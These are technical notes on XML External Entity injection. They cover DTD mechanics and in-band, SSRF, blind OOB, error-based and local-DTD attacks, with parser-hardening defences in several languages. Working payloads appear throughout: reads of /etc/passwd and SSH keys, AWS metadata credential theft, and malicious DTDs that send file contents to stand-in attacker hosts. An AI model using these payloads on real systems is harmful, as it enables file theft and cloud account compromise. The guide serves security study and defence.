# XML External Entity (XXE) Injection — Deep Technical Notes

## Table of Contents

1. [XML & DTD Foundations](#1-xml--dtd-foundations)
2. [What is XXE?](#2-what-is-xxe)
3. [How XXE Vulnerabilities Arise](#3-how-xxe-vulnerabilities-arise)
4. [Entity Types — The Full Taxonomy](#4-entity-types--the-full-taxonomy)
5. [Attack Types & Exploitation Techniques](#5-attack-types--exploitation-techniques)
   - 5.1 [File Retrieval (In-Band)](#51-file-retrieval-in-band)
   - 5.2 [SSRF via XXE](#52-ssrf-via-xxe)
   - 5.3 [Blind XXE — OOB Detection](#53-blind-xxe--oob-detection)
   - 5.4 [Blind XXE — OOB Data Exfiltration via Malicious DTD](#54-blind-xxe--oob-data-exfiltration-via-malicious-dtd)
   - 5.5 [Blind XXE — Error-Based Data Retrieval](#55-blind-xxe--error-based-data-retrieval)
   - 5.6 [Blind XXE — Repurposing a Local DTD (No OOB)](#56-blind-xxe--repurposing-a-local-dtd-no-oob)
6. [Hidden Attack Surfaces](#6-hidden-attack-surfaces)
   - 6.1 [XInclude Attacks](#61-xinclude-attacks)
   - 6.2 [XXE via File Upload](#62-xxe-via-file-upload)
   - 6.3 [XXE via Content-Type Switching](#63-xxe-via-content-type-switching)
7. [Detection Methodology](#7-detection-methodology)
8. [Impact Assessment](#8-impact-assessment)
9. [Defense & Prevention](#9-defense--prevention)
10. [Quick Reference Cheat Sheet](#10-quick-reference-cheat-sheet)

---

## 1. XML & DTD Foundations

Before exploiting XXE you need to understand exactly what XML, DTDs, and entities are — because the attack is entirely built on abusing the XML specification itself, not a coding mistake.

### What is XML?

XML (Extensible Markup Language) is a data serialization format used to store and transport structured data. Unlike HTML, XML has no predefined tags — developers define their own. It was heavily used in early web architectures (SOAP, RSS, configuration files) and is still widely used in enterprise and legacy systems.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
    <storeId>29</storeId>
</stockCheck>
```

### What is a DTD?

The Document Type Definition (DTD) defines the **rules and structure** of an XML document — what tags are allowed, what data types they hold, and critically, what **entities** exist. It sits inside the optional `<!DOCTYPE>` element at the top of the document.

**Internal DTD** — rules defined inside the document itself:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY greeting "Hello World">
]>
<root>&greeting;</root>
```

**External DTD** — rules loaded from an external file or URL:
```xml
<!DOCTYPE foo SYSTEM "http://example.com/schema.dtd">
```

**Hybrid DTD** — a document that references an external DTD but also defines internal entities. This hybrid structure has important security implications (see Section 5.6).

### What are XML Entities?

Entities are **placeholder tokens** that get substituted with their defined value at parse time — like variables. They are referenced using `&entityname;` syntax.

**Built-in entities** (always available):

| Entity | Character | Purpose |
|--------|-----------|---------|
| `&lt;` | `<` | Escape the tag-opening character |
| `&gt;` | `>` | Escape the tag-closing character |
| `&amp;` | `&` | Escape the entity reference character |
| `&quot;` | `"` | Escape double-quote |
| `&apos;` | `'` | Escape single-quote |

**Custom entities** — defined by the developer inside the DTD:
```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value"> ]>
<root>&myentity;</root>
<!-- Parser substitutes: <root>my entity value</root> -->
```

---

## 2. What is XXE?

XXE (XML External Entity) injection is a vulnerability where an attacker **injects a malicious entity definition** into the DTD, pointing the entity's value to a **file on the server's filesystem, an internal URL, or an attacker-controlled server**. When the XML parser resolves the entity, it fetches that content and embeds it into the document — effectively making the server read files and make network requests on the attacker's behalf.

### Simple Analogy

Think of an entity like a mail-merge placeholder in a Word document — `{name}` gets replaced with actual name data at print time. Now imagine you can **redefine what `{name}` expands to** and point it at a file on the server's hard drive instead of a database field. When the document is "printed" (parsed), the file contents appear in place of the placeholder.

---

## 3. How XXE Vulnerabilities Arise

XXE is not a coding bug in the traditional sense — it is a **misconfiguration of the XML parser**. The XML specification itself defines external entities as a legitimate feature. Standard XML parsing libraries support them **by default**. The developer rarely thinks to disable a feature they don't know exists.

```
User sends XML  →  Application passes to XML parser  →  Parser resolves entities
                                                                    ↑
                                              Attacker controls entity definition here
```

**Why parsers are dangerous by default:**

Most XML parsers (Java's `DocumentBuilderFactory`, PHP's `libxml`, Python's `lxml`, .NET's `XmlDocument`) have external entity resolution **enabled out of the box**. The developer wrote code to parse XML but never considered that the parser would obediently fetch files and URLs embedded in the XML it receives.

---

## 4. Entity Types — The Full Taxonomy

Understanding all entity types is critical because different attack techniques rely on different entity types, and some types are blocked while others aren't.

### Regular (General) Entities

Defined with `<!ENTITY name "value">`, referenced with `&name;` in the XML body. These are the most straightforward type and what most people think of when discussing XXE.

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
...
<productId>&xxe;</productId>
```

### External Entities

A **regular entity whose value is loaded from outside the document** using the `SYSTEM` keyword followed by a URI. The URI can use several protocols:

```xml
<!ENTITY ext SYSTEM "file:///etc/passwd">     <!-- local file -->
<!ENTITY ext SYSTEM "http://internal-host/">  <!-- HTTP request -->
<!ENTITY ext SYSTEM "ftp://internal-ftp/">    <!-- FTP request -->
```

These are the primary vehicle for classic XXE attacks.

### XML Parameter Entities

A **special entity type that can only be referenced inside the DTD**, not in the XML body. Declared with a `%` before the name, referenced with `%name;` instead of `&name;`.

```xml
<!ENTITY % myparameterentity "my parameter entity value">
%myparameterentity;  <!-- referenced in DTD only -->
```

**Why they matter for XXE:**

When regular external entities are blocked by input validation or parser hardening, parameter entities often still work because they are a less commonly known feature. They are essential for blind exfiltration because they allow dynamic construction of entity declarations inside the DTD itself.

**The critical rule:** Nesting parameter entity declarations (using one to define another) is **only allowed in external DTDs**, not internal ones. This constraint — and how to bypass it using a local DTD — is the basis of Section 5.6.

---

## 5. Attack Types & Exploitation Techniques

### 5.1 File Retrieval (In-Band)

**What it is:** The simplest form — define an external entity pointing at a file, use the entity in a value that gets reflected in the response.

**Two-step modification required:**
1. Add a `DOCTYPE` with an entity definition pointing to the target file.
2. Reference that entity in a field that appears in the server's response.

**Normal request:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
    <storeId>29</storeId>
</stockCheck>
```

**Injected request:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>29</storeId>
</stockCheck>
```

**What happens:**
1. Parser sees `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — notes the entity definition.
2. Parser reaches `&xxe;` in `<productId>` — resolves it by reading `/etc/passwd` from disk.
3. File contents are substituted in place of `&xxe;`.
4. Application processes the productId (now containing file contents) and returns it in the response (typically as an error like "Invalid product ID: root:x:0:0:...").

**Important:** You must test each data node in the XML — the field reflected in the response is the one that carries the payload. Not all fields are reflected.

**Target files:**
```
/etc/passwd          → user accounts (always readable)
/etc/hostname        → machine name
/etc/hosts           → internal network map
/proc/self/environ   → environment variables (may contain secrets)
~/.ssh/id_rsa        → private SSH key (if running as user with keys)
/var/www/html/config.php  → application config (DB credentials)
```

---

### 5.2 SSRF via XXE

**What it is:** Instead of pointing the external entity at a `file://` URI, point it at an `http://` URI. The server becomes a proxy — it makes an HTTP request to wherever you direct it.

**Payload:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

**Why this is powerful:**
- The server makes requests from its own IP — bypassing external firewalls that block access to internal services.
- Cloud metadata endpoints (AWS, GCP, Azure) are only reachable from the instance itself — and are common SSRF targets.

**AWS EC2 Metadata exploitation:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```

Response: a list of available metadata paths. Enumerate iteratively:
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```

The final endpoint returns temporary AWS credentials including `AccessKeyId`, `SecretAccessKey`, and `Token` — full cloud account compromise from an XXE.

**Two-way vs blind SSRF:**
- If the HTTP response content appears in the application's output → two-way interaction, full response visible.
- If it doesn't appear → blind SSRF (can still confirm interaction via OOB, and can pivot to internal services).

---

### 5.3 Blind XXE — OOB Detection

**What it is:** The application doesn't return entity values in its response. You confirm XXE exists by triggering an outbound network connection from the server to a system you control.

**Method 1 — Regular external entity:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-DOMAIN"> ]>
...
<productId>&xxe;</productId>
```

The server fetches that URL — you see a DNS lookup and HTTP request in Burp Collaborator.

**Method 2 — XML parameter entity (when regular entities are filtered):**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-DOMAIN"> %xxe; ]>
```

Note: `%xxe;` is referenced **inside the DOCTYPE** (within the DTD), not in the XML body — this bypasses filters that look for `&entity;` patterns in element values.

**What OOB detection confirms:**
- The parser is processing external entities (vulnerable).
- The server can make outbound DNS/HTTP requests (useful for planning exfiltration).
- External entity loading is not fully disabled.

OOB detection by itself doesn't extract data — move to 5.4 or 5.5 for that.

---

### 5.4 Blind XXE — OOB Data Exfiltration via Malicious DTD

**What it is:** You host a malicious DTD file on your own server. The target server fetches and executes it. The DTD instructs the parser to read a file and transmit its contents to you via an HTTP or DNS request.

**Why a separate DTD file is required:**

The XML specification forbids nesting parameter entity declarations inside an internal DTD — you cannot write:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker/?x=%file;'>">
```
...in a DTD that is entirely inline inside the `DOCTYPE` element. The parser will reject the nested definition. But this **is allowed** in an external DTD file.

**Step 1 — Create and host the malicious DTD:**

Host this file at `http://attacker-server.com/malicious.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-server.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**What this DTD does, step by step:**
1. `%file` — reads `/etc/passwd` from disk, stores as a string.
2. `%eval` — dynamically declares a new entity `%exfiltrate` whose URL contains `%file`'s value.
3. `%eval;` — triggers that dynamic declaration.
4. `%exfiltrate;` — causes an HTTP request to attacker's server with the file contents in the query string.

**Step 2 — Inject into the target application:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker-server.com/malicious.dtd">
    %xxe;
]>
<stockCheck><productId>1</productId></stockCheck>
```

The `%xxe;` causes the parser to fetch and execute the remote DTD. All steps in the malicious DTD then execute, and you see the `/etc/passwd` content arrive at your server.

**Newline limitation:** `/etc/passwd` contains newlines. Some XML parsers reject URLs with newlines. In that case, target `/etc/hostname` (single line) instead, or use FTP protocol which handles multi-line content better.

---

### 5.5 Blind XXE — Error-Based Data Retrieval

**What it is:** Instead of transmitting file contents over the network, you embed the contents into an **XML parsing error message** that gets returned in the HTTP response. No outbound connection needed — the data comes back in the error.

**Mechanism:** Force the parser to try loading a file at a path that **includes the contents of another file**. Since the path won't exist, the parser throws an error — and the error message contains the attempted path, which is the file contents.

**Malicious DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Step by step:**
1. `%file` → reads `/etc/passwd` → value is the file's text content.
2. `%eval` → declares `%error`, a parameter entity whose "file path" is `file:///nonexistent/<contents of passwd>`.
3. `%eval;` → instantiates `%error`.
4. `%error;` → parser tries to open `file:///nonexistent/root:x:0:0:root:/root:/bin/bash...` — fails.
5. Error thrown: `java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...`
6. If the application returns this error in its response, you've read the file.

**Inject into the application:**
Host the DTD remotely, then:
```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker-server.com/error.dtd">
    %xxe;
]>
```

**This technique works when:**
- Outbound HTTP/DNS is blocked (no OOB possible).
- The application returns XML parser error messages in its HTTP response.

**This technique fails when:**
- Application catches errors silently.
- Error messages are generic (no detail returned).

---

### 5.6 Blind XXE — Repurposing a Local DTD (No OOB)

**The hardest scenario:** Outbound connections are blocked AND error messages are returned but only when triggered through a specific mechanism. You cannot load a remote DTD, but you can still use the error-based technique — by hijacking a DTD file **that already exists on the server**.

**The loophole in the XML spec:**

The rule against nesting parameter entities applies to fully internal DTDs. However, when a document uses a **hybrid DTD** (internal + external), it can redefine entities from the external DTD in the internal portion — and that redefined internal entity *can* contain nested parameter declarations.

So: if you can reference an existing local DTD file as the "external" component, you can redefine any of its entities in the internal component to contain your error-based exploit payload.

**Attack structure:**
```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

**What this does:**
1. `%local_dtd` — loads the real DTD from `/usr/local/app/schema.dtd`.
2. Redefines `%custom_entity` (which already exists in that DTD) with the error-based XXE payload.
3. `%local_dtd;` — processes the external DTD, which triggers the redefined entity, which runs the exploit.

**How to find a suitable local DTD:**

Use a probe to check if a known DTD path exists:
```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    %local_dtd;
]>
```

If the file exists → no error (or a different error than "file not found"). If it doesn't → file-not-found error. Common DTD locations on Linux:

```
/usr/share/yelp/dtd/docbookx.dtd        → GNOME systems (very common on Ubuntu/Kali)
/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
/usr/share/sgml/docbook/dtd/4.2/docbookx.dtd
/usr/local/app/schema.dtd               → application-specific
/etc/xml/catalog                         → XML catalog file
```

Once a file is found, obtain a copy of it (most are open source), find an entity it defines, and use that entity name as the redefinition target.

---

## 6. Hidden Attack Surfaces

### 6.1 XInclude Attacks

**When standard XXE doesn't work:**

Classic XXE requires you to control the entire XML document (specifically the `DOCTYPE` element). In some architectures, user input is embedded **into a server-side XML document** that already has its own structure — you only control a fragment, not the whole document.

Example: a form field value gets embedded in a SOAP request server-side. You can't add a `DOCTYPE` because the server constructs the outer document.

**XInclude is the solution:**

XInclude is an XML specification feature that lets you **embed one XML document inside another**. Unlike external entity definitions (which go in `DOCTYPE`), an XInclude directive can be placed **anywhere in the document** — including in a single data value you control.

**Payload (inject into any data field):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Key attributes:**
- `xmlns:xi` — declares the XInclude namespace (required for the parser to recognize `xi:include`).
- `parse="text"` — tells the parser to include the file as plain text, not as XML (without this, the parser tries to parse the file as XML and fails on `/etc/passwd`).
- `href` — the file URI to include.

This payload can replace the content of a single form field or XML element — it does not require access to `DOCTYPE`.

---

### 6.2 XXE via File Upload

**What it is:** Applications that accept file uploads and process them server-side may use XML-based formats internally — even when the user uploads what appears to be a non-XML file.

**The SVG vector:**

SVG (Scalable Vector Graphics) is an XML-based image format. An application that accepts image uploads and processes them through an image library (ImageMagick, Batik, etc.) may silently parse SVG files as XML, even if it expects PNG or JPEG.

**Malicious SVG payload:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload as an "avatar" or "image". When the server processes/renders the SVG, the parser resolves `&xxe;` and embeds the file contents into the image. If the image is later displayed, the text element reveals the file contents visually.

**Other XML-based formats to try:**
- DOCX / XLSX / PPTX — Office Open XML (ZIP containing XML files). Modify the internal XML files before uploading.
- XML-based config files — if the application allows uploading configs.
- RSS/Atom feeds — if the app parses feed imports.

---

### 6.3 XXE via Content-Type Switching

**What it is:** An endpoint that normally accepts `application/x-www-form-urlencoded` (standard form data) may also silently accept and parse `text/xml` or `application/xml` content types.

**Normal request:**
```http
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

**Modified request (switching to XML):**
```http
POST /action HTTP/1.1
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

If the application tolerates both formats and passes the body to an XML parser when it detects XML content, the XXE executes.

**Why this surface is frequently missed:**

Security scanners and manual testers focus on endpoints that already receive XML. This technique opens up attack surface on endpoints that *don't visibly use XML* — any endpoint that might have server-side XML processing under the hood.

---

## 7. Detection Methodology

### Step 1 — Identify XML Entry Points

Look for:
- Requests with `Content-Type: text/xml` or `application/xml`
- Request bodies containing `<?xml`, `<!DOCTYPE`, or obvious XML structure
- API endpoints accepting SOAP
- File upload endpoints (SVG, DOCX, XLSX, config files)
- Any POST parameter that might be embedded server-side into XML (SOAP backends)

### Step 2 — Confirm XML Parsing

Try submitting malformed XML (unclosed tag, invalid character) — if the server returns an XML parsing error, it is actively parsing the body.

### Step 3 — Probe for Entity Support

Add a simple internal entity first (no external file, no network request) to confirm the parser handles entities at all:
```xml
<!DOCTYPE foo [ <!ENTITY test "hello"> ]>
<stockCheck><productId>&test;</productId></stockCheck>
```

If `hello` appears in the response → entity resolution works → proceed to external entities.

### Step 4 — Test In-Band File Retrieval

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Use `&xxe;` in every field that gets reflected. If any response contains `/etc/passwd` contents → direct XXE confirmed.

### Step 5 — If No In-Band Output, Test Blind

Use OOB with a Collaborator or self-hosted server:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-SERVER/test"> ]>
```

If no DNS/HTTP interaction → try parameter entities:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/test"> %xxe; ]>
```

### Step 6 — Test Non-Standard Surfaces

- Change `Content-Type` to `text/xml` on non-XML endpoints.
- Upload SVG files disguised as images.
- Test XInclude in individual data fields.

---

## 8. Impact Assessment

| XXE Type | Requires | Impact |
|----------|----------|--------|
| In-band file retrieval | Reflected field | Read any file the server process can access |
| SSRF via XXE | HTTP entity resolution | Access internal services, cloud metadata, pivot to internal network |
| Blind OOB exfiltration | Outbound DNS/HTTP | Read files via DNS subdomains or HTTP requests — no response reflection needed |
| Error-based retrieval | Error messages returned | Read files via parser errors — no OOB needed |
| Local DTD repurposing | No OOB, no error visibility needed | Most advanced — works in highly restricted environments |
| XInclude | Only partial XML control | File read even without DOCTYPE access |
| SVG upload | File upload feature | File read through image processing pipeline |

### Escalation Paths

```
XXE
 │
 ├── Read /etc/passwd → enumerate users
 ├── Read app config → DB credentials → full database dump
 ├── Read ~/.ssh/id_rsa → SSH access to server
 ├── SSRF → http://169.254.169.254/ → AWS credentials → cloud takeover
 ├── SSRF → internal admin panels, unprotected APIs
 └── SSRF → other internal hosts → pivot / lateral movement
```

---

## 9. Defense & Prevention

### Primary Defense — Disable External Entity Resolution in the Parser

This is the single most effective control. External entity processing is a parser-level feature — turn it off.

**Java (DocumentBuilderFactory):**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**PHP (libxml):**
```php
libxml_disable_entity_loader(true);  // PHP < 8.0
// PHP 8.0+ has this disabled by default
```

**Python (lxml):**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

**.NET (XmlReader):**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

### Secondary Defense — Disable DTD Processing Entirely

If your application doesn't need DTDs (most don't), disabling DTD processing entirely eliminates the XXE attack surface completely:

```java
// Java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

This is more aggressive than just disabling external entities — it prevents any DOCTYPE declaration from being processed at all.

### Defense Against XInclude

XInclude is a separate XML feature with its own disable option:
```java
dbf.setXIncludeAware(false);  // Java
```

```python
parser = etree.XMLParser(load_dtd=False, no_network=True)  # lxml
```

### Defense Against File Upload XXE

- When accepting image uploads, use a library that parses the image format directly — not one that processes it as generic XML.
- Re-render/transcode uploaded images through a safe pipeline before storage.
- Reject SVG uploads entirely if not strictly required.
- For DOCX/XLSX, unzip and sanitize the internal XML files before processing.

### Defense Against Content-Type Switching

- Strictly validate that the `Content-Type` header matches what the application expects.
- Reject bodies that don't match the declared content type.
- Never pass unexpected XML-formatted bodies to an XML parser.

### Defense in Depth — Egress Filtering

Even if XXE exists, outbound network connections from the server to attacker-controlled systems can be blocked at the network layer:
- Restrict outbound HTTP to known-good destinations.
- Block outbound DNS to external resolvers.
- This doesn't prevent file-read XXE but defeats OOB exfiltration.

---

## 10. Quick Reference Cheat Sheet

### Entity Syntax Reference

```xml
<!-- General external entity (file) -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<field>&xxe;</field>

<!-- General external entity (HTTP/SSRF) -->
<!ENTITY xxe SYSTEM "http://internal-server/">

<!-- Parameter entity (DTD-only, used for blind) -->
<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
%xxe;

<!-- XInclude (no DOCTYPE needed) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Malicious External DTD — OOB Exfil

```xml
<!-- Host this at http://attacker.com/malicious.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

<!-- Inject in target: -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
```

### Malicious External DTD — Error-Based

```xml
<!-- Host this at http://attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- Inject in target: -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>
```

### Local DTD Repurposing — No OOB

```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

### Common Local DTD Probe List

```
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
/usr/share/sgml/docbook/dtd/4.2/docbookx.dtd
/usr/local/app/schema.dtd
/etc/xml/catalog
/usr/share/kde4/apps/ksgmltools2/docbook/dtd/kdex.dtd
```

### High-Value Target Files

```
/etc/passwd            → user accounts (always readable)
/etc/hostname          → single-line, great for DTD exfil (no newline issues)
/etc/hosts             → internal network map
/proc/self/environ     → environment variables (may contain secrets/tokens)
~/.ssh/id_rsa          → private SSH key
/var/www/html/*.php    → source code (find config files, credentials)
/proc/self/cmdline     → command line of the running process
/proc/self/cwd         → symlink to current working directory
```

### Detection Decision Tree

```
Is XML being submitted?
├── Yes → add external entity → does output appear in response?
│         ├── Yes → In-band XXE confirmed
│         └── No  → Blind — test OOB (Collaborator)
│                   ├── DNS interaction seen → Blind OOB confirmed
│                   │   → Move to malicious DTD exfil or error-based
│                   └── No interaction → OOB blocked
│                       → Try error-based → try local DTD repurposing
│
└── No  → Switch Content-Type to text/xml → retry
          → Try XInclude in any data field
          → Try SVG upload if file upload exists
```